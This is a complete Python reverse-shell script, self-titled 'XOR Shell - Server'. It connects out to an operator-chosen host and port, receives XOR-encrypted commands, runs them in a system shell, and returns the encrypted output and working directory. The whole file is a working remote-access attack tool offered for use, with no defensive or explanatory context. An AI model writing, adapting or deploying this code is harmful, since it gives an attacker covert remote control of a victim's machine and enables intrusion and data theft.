#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
# Python 3.X.X
# Autors: Xtr3am3r.0k@gmail.com, jerskisnow
# Requirements: pycrypto (https://www.dlitz.net/software/pycrypto/)
import os
import subprocess
import argparse
from socket import socket, AF_INET, SOCK_STREAM
from Crypto.Cipher import XOR

parser = argparse.ArgumentParser(description='XOR Shell - Server')
parser.add_argument('-a','--host', help='set lhost', required=True)
parser.add_argument('-p','--port', help='set lport', required=True)
parser.add_argument('-k','--key', help='set XOR key', required=True)
args = vars(parser.parse_args())

myHOST = args['host']
myPORT = int(args['port'])
key = args['key']

def encrypt(cleardata):
    data = XOR.XORCipher(key)
    return data.encrypt(cleardata)

def decrypt(cleardata):
    data = XOR.XORCipher(key)
    return data.decrypt(cleardata)

def main():
    sockobj = socket(AF_INET, SOCK_STREAM)
    sockobj.connect((myHOST, myPORT))

    while True:
        output = ''
        data = (decrypt(sockobj.recv(1024))).decode('cp866')
        if len(data) > 0:
            if data[:2] == 'cd':
                try:
                    os.chdir(data[3:])
                except:
                    output = 'enter cd error'

            cmd = subprocess.Popen(data[:], shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE)
            output = (cmd.stdout.read() + cmd.stderr.read()).decode('cp866')
            sockobj.send(encrypt(output + (os.getcwd() + '> ')))

if __name__ == "__main__":
    main()